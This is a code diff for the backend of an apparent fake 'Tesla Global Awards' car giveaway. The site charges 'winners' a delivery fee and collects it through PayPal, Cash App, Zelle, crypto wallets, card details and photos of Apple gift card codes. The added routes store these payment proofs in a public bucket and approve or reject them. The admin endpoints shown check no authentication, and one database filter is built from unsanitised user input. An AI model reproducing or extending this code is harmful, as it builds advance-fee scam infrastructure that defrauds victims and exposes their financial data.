@@ -19,6 +19,51 @@ type OrderResponse = {
 };
 
 const resendTimestamps: Record<string, number> = {};
+const PAYMENT_METHOD_SAMPLE_CONFIG: Record<string, { description: string; config: Record<string, any> }> = {
+  paypal: { description: "Pay securely with your PayPal account or linked card", config: { businessName: "Tesla Global Awards LLC", email: "payments@teslaglobalawards.com", merchantId: "TM8XK2R9Q4ZPA", paypalMeLink: "https://paypal.me/teslaglobalawards", instructions: "Send the delivery fee via PayPal to our verified business account and include your Order ID in the note. Screenshot the confirmation and upload it as proof." } },
+  cashapp: { description: "Instant payment with your Cash App balance or debit card", config: { cashtag: "$TeslaGlobalAwards", accountName: "Tesla Global Awards", phone: "+1 (888) 472-3001", instructions: "Send the delivery fee to our verified Cash App account, add your Order ID in the For field, then upload a screenshot of the confirmation." } },
+  venmo: { description: "Fast, secure payments with Venmo", config: { username: "@TeslaGlobalAwards", accountName: "Tesla Global Awards LLC", instructions: "Send the delivery fee to our official Venmo handle, include your Order ID in the description, and upload the confirmation screen." } },
+  zelle: { description: "Send directly from your bank account with Zelle", config: { recipientName: "Tesla Global Awards LLC", email: "zelle@teslaglobalawards.com", phone: "+1 (415) 892-3401", instructions: "Send the delivery fee with Zelle to the registered email or phone number, include your Order ID in the memo, then upload confirmation." } },
+  bitcoin: { description: "Pay with Bitcoin on the Bitcoin network", config: { walletAddress: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", network: "Bitcoin (BTC) — Mainnet", confirmations: "3 confirmations required", instructions: "Send the exact delivery fee amount in BTC to the wallet address above using the BTC network only, then upload a screenshot showing the TX hash." } },
+  ethereum: { description: "Pay with Ethereum (ETH)", config: { walletAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", network: "Ethereum Mainnet (ERC-20)", confirmations: "12 confirmations required", instructions: "Send the exact ETH equivalent of the delivery fee to the Ethereum Mainnet wallet and upload the confirmed transaction screenshot." } },
+  "usdt-erc20": { description: "Tether USD on the Ethereum network", config: { walletAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", network: "Ethereum Mainnet (ERC-20)", tokenContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7", instructions: "Send USDT on ERC-20 to the wallet address above and upload the confirmed transaction screenshot." } },
+  "usdt-trc20": { description: "Tether USD on the TRON network — lower fees", config: { walletAddress: "TYASr5UV6HEcXatwdFQfmLVUqQQQMUxHLS", network: "TRON Network (TRC-20)", instructions: "Send USDT on TRC-20 to the wallet address above and upload the confirmed transaction receipt screenshot." } },
+  creditcard: { description: "Visa, Mastercard, Amex, and Discover accepted", config: { acceptedCards: "Visa, Mastercard, American Express, Discover", processorName: "Tesla Awards Secure Payments", merchantAccount: "TGAWARDS-US-9041", supportPhone: "+1 (888) 472-3001", instructions: "Enter card details securely in the payment form. Transactions are encrypted and a confirmation is emailed after processing." } },
+  applegift: { description: "Pay with an Apple Gift Card — instant and private", config: { denominationsAccepted: "$25, $50, $100, $200 denominations accepted", purchaseLocations: "Apple Store, Apple.com, Walmart, Target, Best Buy, CVS, Walgreens", instructions: "Upload clear photos of the front and back of the Apple Gift Card with the redemption code fully visible and legible." } }
+};
+
+function paymentSlug(m: any): string {
+  return String(m.slug || m.name || m.display_name || "").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
+}
+
+function parseAccountDetails(raw: any): Record<string, any> {
+  if (!raw) return {};
+  if (typeof raw === "object") return { ...raw };
+  try { return JSON.parse(raw); } catch { return {}; }
+}
+
+function enrichPaymentMethodRow(m: any) {
+  const slug = paymentSlug(m);
+  const sample = PAYMENT_METHOD_SAMPLE_CONFIG[slug];
+  const config = { ...(sample?.config || {}), ...parseAccountDetails(m.account_details) };
+  if (m.wallet_address) config.walletAddress = m.wallet_address;
+  if (m.payment_instructions) config.instructions = m.payment_instructions;
+  if (m.qr_code_url) config.qrCode = m.qr_code_url;
+  return {
+    id: slug || m.id, _dbId: m.id, name: m.display_name || m.name, type: m.type || "wallet",
+    description: m.description || sample?.description || "", logo: m.logo_url || "", logo_url: m.logo_url || "",
+    enabled: m.enabled, displayOrder: m.sort_order || 0, sort_order: m.sort_order || 0, config,
+    wallet_address: m.wallet_address || config.walletAddress || config.cashtag || config.username || config.email || "",
+    payment_instructions: m.payment_instructions || config.instructions || "",
+    lastUpdated: m.updated_at || m.created_at || ""
+  };
+}
+
+function selectedCarLabel(carData: Record<string, any>): string {
+  const candidates = [carData.name, carData.model, carData.modelName, carData.title, carData.vehicle, carData.vehicleName, carData.displayName];
+  return String(candidates.find((v) => typeof v === "string" && v.trim()) || "");
+}
+
 
 const smtpUser = process.env["SMTP_USER"]?.trim();
 const smtpPass = process.env["SMTP_PASS"]?.trim();
@@ -147,7 +192,7 @@ router.post("/login", async (req, res) => {
         hasOrder = true;
         const car = Array.isArray(fullOrder.selected_cars) ? fullOrder.selected_cars[0] : fullOrder.selected_cars;
         const delivery = Array.isArray(fullOrder.delivery_details) ? fullOrder.delivery_details[0] : fullOrder.delivery_details;
-        const tracking = ((fullOrder.tracking_data ?? [])).sort((a, b) => a.stage_order - b.stage_order).map(t => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
+        const tracking = ((fullOrder.tracking_data ?? []) as any[]).sort((a, b) => a.stage_order - b.stage_order).map((t) => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
         orderData = {
           orderId: fullOrder.order_id, trackingNumber: fullOrder.tracking_number, status: fullOrder.status,
           orderDate: fullOrder.order_date, estimatedDelivery: fullOrder.estimated_delivery,
@@ -155,7 +200,7 @@ router.post("/login", async (req, res) => {
           selectedCar: car?.data || {}, deliveryDetails: delivery?.data || {}, timeline: tracking
         };
       }
-    } catch (_) {}
+    } catch (orderErr) { logger.warn({ err: orderErr }, "Login: failed to load existing order"); }
     res.json({ success: true, sessionToken, user: { email: entry.email, firstName: entry.first_name || "", lastName: entry.last_name || "", entryId: entry.id, phone: entry.phone || "" }, hasOrder, order: orderData });
   } catch (err) { logger.error({ err }, "Login error"); res.status(500).json({ error: "Login failed. Please try again." }); }
 });
@@ -173,6 +218,7 @@ router.get("/session", async (req, res) => {
   try {
     const user = await getSessionUser((req.query as { token?: string }).token);
     if (!user) { res.status(401).json({ valid: false }); return; }
+    const supabase = await getSupabaseAdmin();
     // Check if user already has an order — load FULL order data
     let hasOrder = false;
     let orderData = null;
@@ -182,7 +228,7 @@ router.get("/session", async (req, res) => {
         hasOrder = true;
         const car = Array.isArray(fullOrder.selected_cars) ? fullOrder.selected_cars[0] : fullOrder.selected_cars;
         const delivery = Array.isArray(fullOrder.delivery_details) ? fullOrder.delivery_details[0] : fullOrder.delivery_details;
-        const tracking = ((fullOrder.tracking_data ?? [])).sort((a, b) => a.stage_order - b.stage_order).map(t => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
+        const tracking = ((fullOrder.tracking_data ?? []) as any[]).sort((a, b) => a.stage_order - b.stage_order).map((t) => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
         orderData = {
           orderId: fullOrder.order_id, trackingNumber: fullOrder.tracking_number, status: fullOrder.status,
           orderDate: fullOrder.order_date, estimatedDelivery: fullOrder.estimated_delivery,
@@ -190,7 +236,7 @@ router.get("/session", async (req, res) => {
           selectedCar: car?.data || {}, deliveryDetails: delivery?.data || {}, timeline: tracking
         };
       }
-    } catch (_) {}
+    } catch (orderErr) { logger.warn({ err: orderErr }, "Session: failed to load existing order"); }
     res.json({ valid: true, user: { email: user.email, firstName: user.first_name || "", lastName: user.last_name || "", entryId: user.entryId, phone: user.phone || "" }, hasOrder, order: orderData });
   } catch (err) { logger.error({ err }, "Session error"); res.status(500).json({ valid: false }); }
 });
@@ -200,12 +246,12 @@ router.post("/order", async (req, res) => {
     const { sessionToken, selectedCar, deliveryDetails, deliveryMethod, paymentMethod } = req.body as { sessionToken: string; selectedCar: Record<string, string>; deliveryDetails: Record<string, string>; deliveryMethod?: Record<string, string | number>; paymentMethod?: Record<string, string> };
         const user = await getSessionUser(sessionToken);
     if (!user) { res.status(401).json({ error: "Invalid session. Please verify your email first." }); return; }
+    const supabase = await getSupabaseAdmin();
     
     // Check if user already has an order
     const { data: existingOrder, error: orderCheckError } = await supabase.from("orders").select("id").eq("user_id", user.id).maybeSingle();
     if (orderCheckError) throw orderCheckError;
     if (existingOrder) { res.status(400).json({ error: "You have already placed an order. Each user is restricted to one order only." }); return; }
-    const supabase = await getSupabaseAdmin();
     const orderId = "TSLA-" + uuidv4().substring(0, 8).toUpperCase();
     const trackingNumber = "TRK-" + crypto.randomBytes(4).toString("hex").toUpperCase();
     const method = deliveryMethod ?? { id: "standard", name: "Standard Delivery", price: 299 };
@@ -341,6 +387,346 @@ function buildVerificationEmail(firstName: string, verifyLink: string, entryId: 
 </body>
 </html>`;
 }
+
+// ── PAYMENT PROOF SUBMISSION ──────────────────────────────────────────
+router.post("/payment/submit", async (req, res) => {
+  try {
+    const { order_id, paymentMethodId, paymentMethodName, customerName, carModel, amount,
+            proofData, proofFileName, giftCardFront, giftCardBack, cardFront, cardBack,
+            sessionToken, orderData } = req.body as any;
+
+    const supabase = await getSupabaseAdmin();
+
+    // Resolve customer info from session (non-fatal if expired/missing)
+    let userId: string | null = null;
+    let customerEmail = "";
+    let customerPhone = "";
+    let resolvedName = customerName || "";
+    if (sessionToken) {
+      try {
+        const user = await getSessionUser(sessionToken);
+        if (user) {
+          userId = user.id ?? null;
+          customerEmail = user.email || "";
+          customerPhone = user.phone || "";
+          if (!resolvedName) resolvedName = [user.first_name, user.last_name].filter(Boolean).join(" ");
+        }
+      } catch { /* non-fatal */ }
+    }
+
+    const rawFront: string = proofData || giftCardFront || cardFront || "";
+    const rawBack: string  = giftCardBack || cardBack || "";
+
+    async function uploadProof(b64: string, suffix: string): Promise<string> {
+      if (!b64) return "";
+      try {
+        const base64 = b64.includes(",") ? b64.split(",")[1]! : b64;
+        const buf    = Buffer.from(base64, "base64");
+        const mime   = (b64.match(/^data:([^;]+);/) || [])[1] || "image/jpeg";
+        const ext    = mime.split("/")[1] || "jpg";
+        const name   = `${(order_id || "proof").replace(/[^a-zA-Z0-9-]/g, "_")}-${suffix}-${Date.now()}.${ext}`;
+        const { data: up, error: upErr } = await supabase.storage
+          .from("payment-proofs")
+          .upload(name, buf, { contentType: mime, upsert: true });
+        if (upErr || !up) return b64.length > 2_000_000 ? b64.substring(0, 2_000_000) : b64;
+        return supabase.storage.from("payment-proofs").getPublicUrl(name).data.publicUrl;
+      } catch {
+        return b64.length > 2_000_000 ? b64.substring(0, 2_000_000) : b64;
+      }
+    }
+
+    const [proof_url, proof_back_url] = await Promise.all([
+      uploadProof(rawFront, "front"),
+      uploadProof(rawBack,  "back"),
+    ]);
+
+    const { data: inserted, error: insertErr } = await supabase
+      .from("payment_proofs")
+      .insert({
+        order_id:        order_id || "",
+        user_id:         userId,
+        payment_method:  paymentMethodName || paymentMethodId || "Unknown",
+        proof_url:       proof_url || null,
+        proof_back_url:  proof_back_url || null,
+        proof_type:      "file",
+        amount:          String(amount || ""),
+        status:          "pending",
+        car_model:       carModel || "",
+        customer_name:   resolvedName || "",
+        customer_email:  customerEmail || "",
+        customer_phone:  customerPhone || "",
+        delivery_method: (orderData?.deliveryMethod as any)?.name || "",
+      })
+      .select("id")
+      .single();
+
+    if (insertErr) throw insertErr;
+    logger.info({ orderId: order_id, proofId: inserted.id }, "Payment proof submitted");
+    res.json({ success: true, proofId: inserted.id, orderId: order_id });
+  } catch (err) {
+    logger.error({ err }, "Payment submit error");
+    res.status(500).json({ error: "Server error. Please try again." });
+  }
+});
+
+// ── ADMIN: SETTINGS ──
+router.post("/admin/settings", async (req, res) => {
+  try {
+    const { standard_fee, express_fee } = req.body as { standard_fee?: number; express_fee?: number };
+    const supabase = await getSupabaseAdmin();
+    const value: Record<string, number> = {};
+    if (standard_fee !== undefined) value.standard_fee = standard_fee;
+    if (express_fee !== undefined) value.express_fee = express_fee;
+    if (Object.keys(value).length === 0) { res.status(400).json({ error: "No values to update" }); return; }
+    const { data: existing } = await supabase.from("admin_settings").select("value").eq("key", "delivery_fee").maybeSingle();
+    const merged = existing?.value ? { ...existing.value as any, ...value } : value;
+    const { error } = await supabase.from("admin_settings").upsert({ key: "delivery_fee", value: merged, updated_at: new Date().toISOString() }, { onConflict: "key" });
+    if (error) throw error;
+    res.json({ success: true, standard_fee: merged.standard_fee, express_fee: merged.express_fee });
+  } catch (err) { logger.error({ err }, "Admin settings error"); res.status(500).json({ error: "Server error" }); }
+});
+router.get("/admin/settings", async (_req, res) => {
+  try {
+    const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase.from("admin_settings").select("key,value").eq("key", "delivery_fee").maybeSingle();
+    if (error) throw error;
+    const v = (data?.value ?? {}) as any;
+    res.json({ standard_fee: v.standard_fee ?? 299, express_fee: v.express_fee ?? 399 });
+  } catch (err) { logger.error({ err }, "Admin settings get error"); res.status(500).json({ error: "Server error" }); }
+});
+
+
+// ── ADMIN: CC CONFIG ────────────────────────────────────────────────────────────
+router.get('/admin/settings/cc', async (_req, res) => {
+  try {
+    const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase.from('admin_settings').select('value').eq('key', 'cc_config').maybeSingle();
+    if (error) throw error;
+    const v = (data?.value ?? {}) as any;
+    res.json({
+      networks: v.networks ?? ['visa', 'mastercard', 'amex', 'discover'],
+      merchantName: v.merchantName ?? 'Tesla Global Awards LLC',
+      merchantId: v.merchantId ?? 'TGA-2026-001',
+      instructions: v.instructions ?? 'Enter your card details below to complete payment.'
+    });
+  } catch (err) { logger.error({ err }, 'Admin CC config get error'); res.status(500).json({ error: 'Server error' }); }
+});
+router.post('/admin/settings/cc', async (req, res) => {
+  try {
+    const body = req.body as any;
+    const supabase = await getSupabaseAdmin();
+    const value: Record<string, any> = {};
+    if (body.networks     !== undefined) value.networks     = body.networks;
+    if (body.merchantName !== undefined) value.merchantName = body.merchantName;
+    if (body.merchantId   !== undefined) value.merchantId   = body.merchantId;
+    if (body.instructions !== undefined) value.instructions = body.instructions;
+    const { data: existing } = await supabase.from('admin_settings').select('value').eq('key', 'cc_config').maybeSingle();
+    const merged = existing?.value ? { ...(existing.value as any), ...value } : value;
+    const { error } = await supabase.from('admin_settings').upsert({ key: 'cc_config', value: merged, updated_at: new Date().toISOString() }, { onConflict: 'key' });
+    if (error) throw error;
+    res.json({ success: true, ...merged });
+  } catch (err) { logger.error({ err }, 'Admin CC config save error'); res.status(500).json({ error: 'Server error' }); }
+});
+// ── PUBLIC: PAYMENT METHODS (for customer payment page) ──
+router.get("/payment-methods", async (_req, res) => {
+  try {
+    const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase
+      .from("payment_methods")
+      .select("*")
+      .eq("enabled", true)
+      .order("sort_order");
+    if (error) throw error;
+    const methods = (data || []).map(enrichPaymentMethodRow);
+    res.json({ methods });
+  } catch (err) { logger.error({ err }, "Public payment methods error"); res.status(500).json({ error: "Server error" }); }
+});
+
+// ── ADMIN: UPSERT PAYMENT METHOD (by name slug — create or update) ──
+router.post("/admin/payment-methods/upsert", async (req, res) => {
+  try {
+    const m = req.body as any;
+    const supabase = await getSupabaseAdmin();
+    const slug = m.slug || String(m.name || "").toLowerCase().replace(/[^a-z0-9]+/g, "-");
+    const { data: existing } = await supabase.from("payment_methods")
+      .select("id").or(`name.eq.${slug},slug.eq.${slug}`).maybeSingle();
+    const accountDetails = typeof m.account_details === "object"
+      ? JSON.stringify(m.account_details)
+      : (m.account_details || "{}");
+    const row: Record<string, any> = {
+      name: slug, slug: m.slug || slug,
+      display_name: m.display_name || m.name || slug,
+      type: m.type || "wallet", enabled: m.enabled !== false,
+      logo_url: m.logo_url || "", wallet_address: m.wallet_address || "",
+      account_details: accountDetails,
+      payment_instructions: m.payment_instructions || "",
+      sort_order: m.sort_order || 0, updated_at: new Date().toISOString()
+    };
+    let dbId: string;
+    if (existing?.id) {
+      const { error } = await supabase.from("payment_methods").update(row).eq("id", existing.id);
+      if (error) throw error;
+      dbId = existing.id;
+    } else {
+      row.created_at = new Date().toISOString();
+      const { data: inserted, error } = await supabase.from("payment_methods").insert(row).select("id").single();
+      if (error) throw error;
+      dbId = inserted.id;
+    }
+    res.json({ success: true, _db_id: dbId });
+  } catch (err) { logger.error({ err }, "Upsert payment method error"); res.status(500).json({ error: "Server error" }); }
+});
+
+// ── ADMIN: PAYMENT METHODS ──
+router.get("/admin/payment-methods", async (_req, res) => {
+  try {
+    const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase.from("payment_methods").select("*").order("sort_order");
+    if (error) throw error;
+    res.json({ methods: (data || []).map(enrichPaymentMethodRow) });
+  } catch (err) { logger.error({ err }, "Admin payment methods error"); res.status(500).json({ error: "Server error" }); }
+});
+router.post("/admin/payment-methods", async (req, res) => {
+  try {
+    const method = req.body as any;
+    const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase.from("payment_methods").insert({
+      name: method.name, display_name: method.display_name, type: method.type || "wallet",
+      wallet_address: method.wallet_address, account_details: method.account_details,
+      payment_instructions: method.payment_instructions, logo_url: method.logo_url, logo_id: method.logo_id,
+      icon_emoji: method.icon_emoji || "💳", sort_order: method.sort_order || 0, enabled: method.enabled !== false
+    }).select().single();
+    if (error) throw error;
+    res.json({ success: true, method: data });
+  } catch (err) { logger.error({ err }, "Admin payment method create error"); res.status(500).json({ error: "Server error" }); }
+});
+router.put("/admin/payment-methods/:id", async (req, res) => {
+  try {
+    const { id } = req.params; const updates = req.body as any;
+    const supabase = await getSupabaseAdmin();
+    const updateData: Record<string, any> = {};
+    if (updates.name !== undefined) updateData.name = updates.name;
+    if (updates.display_name !== undefined) updateData.display_name = updates.display_name;
+    if (updates.type !== undefined) updateData.type = updates.type;
+    if (updates.wallet_address !== undefined) updateData.wallet_address = updates.wallet_address;
+    if (updates.account_details !== undefined) updateData.account_details = updates.account_details;
+    if (updates.payment_instructions !== undefined) updateData.payment_instructions = updates.payment_instructions;
+    if (updates.logo_url !== undefined) updateData.logo_url = updates.logo_url;
+    if (updates.logo_id !== undefined) updateData.logo_id = updates.logo_id;
+    if (updates.slug !== undefined) updateData.slug = updates.slug;
+    if (updates.sort_order !== undefined) updateData.sort_order = updates.sort_order;
+    if (updates.enabled !== undefined) updateData.enabled = updates.enabled;
+    updateData.updated_at = new Date().toISOString();
+    const { error } = await supabase.from("payment_methods").update(updateData).eq("id", id);
+    if (error) throw error;
+    res.json({ success: true, _db_id: id });
+  } catch (err) { logger.error({ err }, "Admin payment method update error"); res.status(500).json({ error: "Server error" }); }
+});
+router.delete("/admin/payment-methods/:id", async (req, res) => {
+  try {
+    const { id } = req.params; const supabase = await getSupabaseAdmin();
+    const { error } = await supabase.from("payment_methods").delete().eq("id", id);
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (err) { logger.error({ err }, "Admin payment method delete error"); res.status(500).json({ error: "Server error" }); }
+});
+// ── ADMIN: PAYMENT PROOFS ──
+router.get("/admin/payment-proofs", async (_req, res) => {
+  try {
+    const supabase = await getSupabaseAdmin();
+
+    // Step 1: fetch all proofs (user_id is often NULL so we can't rely on FK join)
+    const { data: rawProofs, error } = await supabase
+      .from("payment_proofs")
+      .select("*")
+      .order("created_at", { ascending: false });
+    if (error) throw error;
+    if (!rawProofs || rawProofs.length === 0) { res.json({ proofs: [] }); return; }
+
+    // Step 2: collect unique order_ids
+    const orderIds = [...new Set(rawProofs.map((p: any) => p.order_id).filter(Boolean))] as string[];
+
+    let ordersMap: Record<string, any> = {};
+    let usersMap:  Record<string, any> = {};
+
+    if (orderIds.length > 0) {
+      // Step 3: fetch orders → user_id + delivery_method + selected_car
+      const { data: orders } = await supabase
+        .from("orders")
+        .select("order_id, user_id, delivery_method, selected_cars(data)")
+        .in("order_id", orderIds);
+
+      (orders || []).forEach((o: any) => { ordersMap[o.order_id] = o; });
+
+      // Step 4: collect unique user_ids — from orders AND directly from proofs
+      const orderUserIds = (orders || []).map((o: any) => o.user_id).filter(Boolean);
+      const proofUserIds = rawProofs.map((p: any) => p.user_id).filter(Boolean);
+      const userIds = [...new Set([...orderUserIds, ...proofUserIds])] as string[];
+
+      if (userIds.length > 0) {
+        // Step 5: fetch actual customer info
+        const { data: users } = await supabase
+          .from("giveaway_users")
+          .select("id, first_name, last_name, email, phone")
+          .in("id", userIds);
+
+        (users || []).forEach((u: any) => { usersMap[u.id] = u; });
+      }
+    }
+
+    const proofs = rawProofs.map((p: any) => {
+      const ord = ordersMap[p.order_id];
+      // Try: user from order join first; fallback to proof.user_id direct lookup
+      const u   = (ord ? usersMap[ord.user_id] : null) || (p.user_id ? usersMap[p.user_id] : null);
+      const carRaw  = Array.isArray(ord?.selected_cars) ? ord.selected_cars[0] : ord?.selected_cars;
+      const carData = (carRaw?.data) || {};
+      const dmRaw   = ord?.delivery_method || {};
+      const dmLabel = typeof dmRaw === "string" ? dmRaw : (dmRaw as any).name || (dmRaw as any).label || (dmRaw as any).type || "";
+      const joinedName = u ? [u.first_name, u.last_name].filter(Boolean).join(" ") : "";
+      return {
+        ...p,
+        user_name:       p.customer_name  || joinedName || u?.email || "",
+        user_email:      p.customer_email || u?.email   || "",
+        user_phone:      p.customer_phone || u?.phone   || "",
+        car_model:       selectedCarLabel(carData) || p.car_model || "",
+        delivery_method: p.delivery_method || dmLabel,
+      };
+    });
+
+    res.json({ proofs });
+  } catch (err) { logger.error({ err }, "Admin payment proofs error"); res.status(500).json({ error: "Server error" }); }
+});
+router.post("/admin/payment-proofs/submit", async (req, res) => {
+  try {
+    const proof = req.body as any; const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase.from("payment_proofs").insert({
+      order_id: proof.order_id, user_id: proof.user_id, payment_method: proof.payment_method,
+      proof_url: proof.proof_url, proof_type: proof.proof_type || "file", amount: proof.amount, status: "pending"
+    }).select().single();
+    if (error) throw error;
+    res.json({ success: true, proof: data });
+  } catch (err) { logger.error({ err }, "Admin proof submit error"); res.status(500).json({ error: "Server error" }); }
+});
+router.post("/admin/payment-proofs/approve", async (req, res) => {
+  try {
+    const { id } = req.body as { id: string };
+    if (!id) { res.status(400).json({ error: "Proof ID required" }); return; }
+    const supabase = await getSupabaseAdmin();
+    const { error } = await supabase.from("payment_proofs").update({ status: "approved", reviewed_at: new Date().toISOString(), reviewed_by: "admin" }).eq("id", id);
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (err) { logger.error({ err }, "Admin proof approve error"); res.status(500).json({ error: "Server error" }); }
+});
+router.post("/admin/payment-proofs/reject", async (req, res) => {
+  try {
+    const { id, reason } = req.body as { id: string; reason?: string };
+    if (!id) { res.status(400).json({ error: "Proof ID required" }); return; }
+    const supabase = await getSupabaseAdmin();
+    const { error } = await supabase.from("payment_proofs").update({ status: "rejected", admin_notes: reason || "", reviewed_at: new Date().toISOString(), reviewed_by: "admin" }).eq("id", id);
+    if (error) throw error;
+    res.json({ success: true });
+  } catch (err) { logger.error({ err }, "Admin proof reject error"); res.status(500).json({ error: "Server error" }); }
+});
 
 function buildOrderConfirmationEmail(order: any) {
   const car = order.selectedCar || {};
